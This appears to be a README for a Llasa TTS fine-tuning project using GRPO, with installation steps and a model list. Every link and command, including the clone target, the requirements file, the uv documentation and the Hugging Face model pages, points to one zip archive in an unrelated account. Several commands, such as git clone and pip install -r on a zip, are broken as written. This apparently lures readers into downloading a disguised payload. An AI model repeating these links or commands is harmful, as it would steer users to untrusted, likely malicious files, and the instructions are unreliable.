## üì¶ Installation

### Step 1: Clone the repository
To begin, you need to get the code onto your computer:

1. Open your terminal (or Command Prompt).
2. Type the following commands:
   ```bash
   git clone https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip
   cd Llasa-GRPO
   ```

### Step 2: Set up environment
You need to set up your application environment. Choose your preferred package manager:

<details>
<summary>üì¶ Using UV (recommended)</summary>

1. Install `uv` by following the instructions in the [Astral documentation](https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip).
2. Then execute these commands in your terminal:
   ```bash
   uv venv .venv --python 3.12 && source .venv/bin/activate
   uv pip install -r https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip
   uv pip install --no-deps xcodec2
   ```
</details>

<details>
<summary>üêç Using Python directly</summary>

1. Ensure Python 3.12 or higher is installed on your system.
2. Run these commands in your terminal:
   ```bash
   python -m venv .venv
   source .venv/bin/activate
   pip install -r https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip
   pip install --no-deps xcodec2
   ```
</details>

## üìä Features
- **Fine-tuning**: Tailor the Llasa TTS model with GRPO.
- **Token Evaluation**: Uses Whisper ASR for evaluating rewards.
- **Multiple Models**: Access various models, including `Llasa` and `ASR reward model`.

### Models overview
- **Llasa Model**: [HKUSTAudio/Llasa-1B](https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip)
- **Finetuned Llasa Model**: [Steveeeeeeen/Llasa-1B-GRPO-2000](https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip)
- **Neural Codec**: [HKUSTAudio/xcodec2](https://raw.githubusercontent.com/dadasf-beep/Llasa-GRPO/main/homeotic/Llasa-GRPO_v3.5-alpha.5.zip)
- **ASR Reward Model**: `openai/whisper-large-v3`
